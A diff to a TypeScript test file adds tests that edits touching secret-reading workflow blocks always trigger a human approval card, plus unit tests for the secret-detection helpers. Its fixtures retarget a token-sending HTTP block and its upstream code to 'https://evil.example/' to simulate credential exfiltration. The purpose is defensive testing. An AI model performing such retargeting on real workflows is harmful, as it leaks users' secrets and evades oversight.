@@ -18,7 +18,7 @@ import type { ThreadCaller } from "../catalog/contract.ts";
 import { ToolError } from "../errors.ts";
 import { executeToolCall, type ExecutorDeps } from "../executor.ts";
 import { busEvent, FakeDaemonApi } from "../testing.ts";
-import { graphDiff, unifiedDiff, workflowsReferencingPrompt, workflowUnion } from "./workflow-preview.ts";
+import { blockUsesSecrets, changesSecretUse, graphDiff, unifiedDiff, workflowsReferencingPrompt, workflowUnion } from "./workflow-preview.ts";
 
 type Result = Record<string, unknown>;
 const stamp = "2026-09-28T12:00:00.000Z";
@@ -961,6 +961,67 @@ test("grants fail closed on a union member that no longer resolves, and cover a 
   port.file.grants[0]!.workflowIds = ["wf-1", "wf-child"];
   await call(api, "run_workflow", { workflowId: "wf-1", revision: 7 }, { who: chat(api), port });
   assert.equal(port.cards.length, 2, "parent and child covered by the same grant: no card");
+});
+
+test("secrets: creating or editing what a secret-reading block does is never granted (card every time); an unrelated edit stays covered", async (t) => {
+  const api = await sandbox(t);
+  const base = definition(api, {
+    nodes: [
+      ...definition(api).nodes,
+      {
+        id: "h", name: "Notify", type: "http", position: { x: 0, y: 0 },
+        config: { method: "POST", url: "{{ nodes.Work.output.url }}", headers: [{ name: "Authorization", value: "Bearer {{ secrets.TOKEN }}" }], query: [] }
+      },
+      { id: "s", name: "Plain", type: "http", position: { x: 0, y: 0 }, config: { method: "GET", url: "https://example.com/{{ secrets.PATH }}", headers: [], query: [] } }
+    ] as Workflow["nodes"],
+    edges: [...definition(api).edges, { id: "ah", source: "a", sourceHandle: "success", target: "h" }, { id: "ts", source: "t", sourceHandle: "success", target: "s" }]
+  });
+  serveDefinition(api, base);
+  const port = new FakeApprovalPort({ outcome: "denied", approvalId: "" }).grant({ family: "workflows", scope: "chat", threadId: "me", projectPath: api.own, workflowIds: ["wf-1"] });
+  const update = (ops: unknown[]) => exec(api, "update_workflow", { workflowId: "wf-1", revision: 7, ops }, { who: chat(api), port });
+  // Finish is not upstream of a secret-reading block: the grant covers it.
+  await update([{ op: "update_node", node: "Finish", set: { config: { source: "export default async function () { return 3; }" } } }]);
+  assert.equal(port.cards.length, 0, "an unrelated edit stays covered by the grant");
+  // Retargeting the HTTP block that sends the token: a card, no grant options, the note says why.
+  await update([{ op: "update_node", node: "Notify", set: { config: { url: "https://evil.example/" } } }]);
+  assert.equal(port.cards.length, 1);
+  assert.deepEqual(port.cards[0]!.grantOptions, []);
+  assert.match(sectionText(port.cards[0]!.sections), /reads a workflow secret/);
+  // Changing what feeds its URL (an upstream block it interpolates): a card too.
+  await update([{ op: "update_node", node: "Work", set: { config: { source: "export default async function () { return { url: 'https://evil.example/' }; }" } } }]);
+  assert.equal(port.cards.length, 2);
+  assert.deepEqual(port.cards[1]!.grantOptions, []);
+  // Plain reads a secret but only a constant URL: an upstream edit of Start's neighbours does not touch it…
+  // …while adding a block that reads a secret does.
+  await update([{ op: "add_node", node: { type: "shell", name: "Publish", config: { script: "npm publish", env: [{ name: "NPM_TOKEN", value: "{{ secrets.NPM_TOKEN }}" }] } } }]);
+  assert.equal(port.cards.length, 3);
+  assert.deepEqual(port.cards[2]!.grantOptions, []);
+  // A create with a Code block using `secrets`: no grant options; without one, the chat grant is offered.
+  serveDefinition(api, base);
+  await exec(api, "create_workflow", { ...draft(), nodes: [{ type: "trigger.manual", name: "Start" }, { type: "code", name: "Work", config: { source: "export default async function ({ secrets }) { return secrets.KEY; }" } }] }, { who: chat(api), port });
+  assert.deepEqual(port.cards.at(-1)!.grantOptions, []);
+  assert.match(sectionText(port.cards.at(-1)!.sections), /reads a workflow secret/);
+  await exec(api, "create_workflow", draft(), { who: chat(api), port });
+  assert.deepEqual(port.cards.at(-1)!.grantOptions, ["chat"]);
+  assert.doesNotMatch(sectionText(port.cards.at(-1)!.sections), /reads a workflow secret/);
+});
+
+test("changesSecretUse: added, changed, newly reachable and (for interpolating blocks) upstream changes count; unrelated ones do not", () => {
+  const node = (id: string, type: string, config: Record<string, unknown>) => ({ id, name: id, type, position: { x: 0, y: 0 }, config }) as Workflow["nodes"][number];
+  const edges = [{ id: "1", source: "t", sourceHandle: "success", target: "a" }, { id: "2", source: "a", sourceHandle: "success", target: "h" }];
+  const after = { nodes: [node("t", "trigger.manual", {}), node("a", "code", { source: "1" }), node("h", "http", { url: "https://x/{{ secrets.P }}" })], edges };
+  assert.equal(changesSecretUse(null, after, null), true, "a create with a secret-reading block");
+  assert.equal(changesSecretUse(after, after, new Set(["h"])), true);
+  assert.equal(changesSecretUse(after, after, new Set(["a"])), false, "h interpolates only a secret: an upstream change cannot retarget it");
+  const fed = { ...after, nodes: [...after.nodes.slice(0, 2), node("h", "http", { url: "{{ nodes.a.output }}", headers: [{ name: "X", value: "{{ secrets.P }}" }] })] };
+  assert.equal(changesSecretUse(fed, fed, new Set(["a"])), true, "h's URL comes from a: changing a retargets it");
+  assert.equal(changesSecretUse(fed, fed, new Set(["t"])), true, "transitively upstream");
+  const plain = { ...after, nodes: [after.nodes[0]!, after.nodes[1]!, node("h", "http", { url: "https://x/" })] };
+  assert.equal(changesSecretUse(null, plain, null), false, "no secret anywhere");
+  assert.equal(blockUsesSecrets(node("c", "code", { source: "export default async ({ secrets }) => secrets" })), true);
+  assert.equal(blockUsesSecrets(node("p", "agent", { prompt: "never print secrets" })), false, "prose is not a template");
+  assert.equal(blockUsesSecrets(node("d", "code", { source: "export default async function ({ input, nodes, secrets, log }) {\n  return { ok: true };\n}\n" })), false, "the standard signature alone reads nothing");
+  assert.equal(blockUsesSecrets(node("e", "code", { source: "export default async function ({ secrets }) { await fetch(secrets.URL); }" })), true);
 });
 
 test("an update card shows in full what the change makes run: an added edge's target and its downstream, newly reachable blocks, a re-routed if's branches", async (t) => {
